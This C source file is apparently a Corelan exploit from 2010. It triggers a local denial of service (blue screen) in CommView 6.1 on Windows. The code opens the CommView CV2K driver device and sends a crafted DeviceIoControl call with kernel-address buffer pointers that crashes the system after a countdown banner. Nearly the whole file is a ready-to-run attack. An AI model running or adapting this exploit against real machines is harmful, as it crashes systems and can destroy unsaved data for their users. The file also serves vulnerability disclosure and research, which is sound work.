/*-------------------------------------------------------------------------*/
/**
# Exploit Title : CommView Version 6.1 (Build 636) Local Denial Of Service (BSOD)   
# Corelan       : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-030
# Date          : April 23rd, 2010
# Author        : p4r4N0ID (T.B)
# Bug found by  : p4r4N0ID (T.B)
# Software Link : http://www.tamos.com/download/main/
# Version       : Version 6.1 (Build 636)
# OS            : Windows
# Tested on     : Windows XP sp2 En (VMWARE)
# Type of vuln  : DoS
# Greetz to     : Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes.
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code.  
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
#
**/
/*--------------------------------------------------------------------------*/

#include <windows.h>
#include <stdio.h>


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}


int __cdecl main( int argc , char * argv[])
{
	HANDLE		hDevice;
	DWORD       junk;
	int i = 10;

	system("cls");	
	printf ("|------------------------------------------------------------------|");
	printf ("|                         __               __                      |");
	printf ("|   _________  ________  / /___ _____     / /____  ____ _____ ___  |");
	printf ("|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |");
	printf ("| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |");
	printf ("| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |");
	printf ("|                                                                  |");
	printf ("|                                       http://www.corelan.be:8800 |");
	printf ("|                                              security@corelan.be |");
	printf ("|                                                                  |");
	printf ("|-------------------------------------------------[ EIP Hunters ]--|");
	printf ("[+] CommView Local Denial Of Service (BSOD) - by p4r4N0ID(T.B)");


	//CHANGE the GUID so it match your device name
	//find it in:  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}
	
	hDevice = CreateFileA("\\\\.\\CV2K_{916BB164-6D0D-45C0-B6C2-79B42A522C17}",
						   0,
						   FILE_SHARE_READ | FILE_SHARE_WRITE,
						   NULL,
						   OPEN_EXISTING,
						   0,
						   NULL);


	if (hDevice == INVALID_HANDLE_VALUE)
	{
		   ShowError();
		   return EXIT_FAILURE;
	}


	printf("\n\n\t\t[!] Started Countdown");

	for(i;i>=1;i--)
	{
		printf("\r -[ %d ]- ",i);

		if(i==1) printf("\n[+] Bye Bye, BOOM!!!");
		Sleep(1000);
	} 

	DeviceIoControl(hDevice, 
					0x00002578, 
					(LPVOID) 0x80000001,
					0,
					(LPVOID) 0x80000002,
					0,
					&junk,  
					(LPOVERLAPPED)NULL);


	return EXIT_SUCCESS;


}
